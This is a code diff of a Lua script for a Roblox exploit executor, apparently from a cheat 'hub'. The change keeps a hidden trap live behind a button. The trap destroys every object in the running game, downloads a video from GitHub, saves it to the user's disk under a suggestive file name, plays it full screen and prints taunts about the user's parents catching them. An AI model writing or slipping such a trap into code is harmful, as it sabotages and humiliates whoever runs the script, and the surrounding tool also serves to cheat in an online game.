@@ -2104,31 +2104,34 @@ susbutton.MouseButton1Down:Connect(function()
 	})
 	
 	wait(5)
-		-- If you're looking at the source I hope you got caught in 4K.
-		for _,v in pairs(game:GetDescendants()) do
-			pcall(function()
-				v:Destroy()
-			end)
-		end
 
-		local ScreenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
-		ScreenGui.IgnoreGuiInset = true
+-- If you're looking at the source I hope you got caught in 4K.
+for _,v in pairs(game:GetDescendants()) do
+    pcall(function()
+        v:Destroy()
+    end)
+end
 
-		local video = Instance.new("VideoFrame", ScreenGui)
+local ScreenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+ScreenGui.IgnoreGuiInset = true
 
-		video.Size = UDim2.new(1,0,1,0)
+local video = Instance.new("VideoFrame", ScreenGui)
 
-		local Name = "LMAOOOOOOOOO4K.mp4"
+video.Size = UDim2.new(1,0,1,0)
 
-		if not isfile(Name) then
-			writefile(Name, game:HttpGet("https://github.com/Tescalus/Pendulum-Hub-V6-REAL/blob/main/cringe%20video.mp4?raw=true"))
-		end
+local Name = "MommyAndDaddyDontOpenThis_Wink_1.mp4"
 
-		video.Video = syn and getsynasset(Name) or getcustomasset(Name)
+if not isfile(Name) then
+    writefile(Name, game:HttpGet("https://github.com/Tescalus/Pendulum-Hub-V6-REAL/blob/main/cringe%20video.mp4?raw=true"))
+end
 
-		video:Play()
+video.Video = syn and getsynasset(Name) or getcustomasset(Name)
 
-		warn("Prepare for your parents to catch you in 4K!")
+repeat task.wait() print("Retrying...") until video.Loaded
+
+video:Play()
+
+warn("Prepare for your parents to catch you in 4K!")
 end)
 
 confirmation.MouseButton1Down:Connect(function()
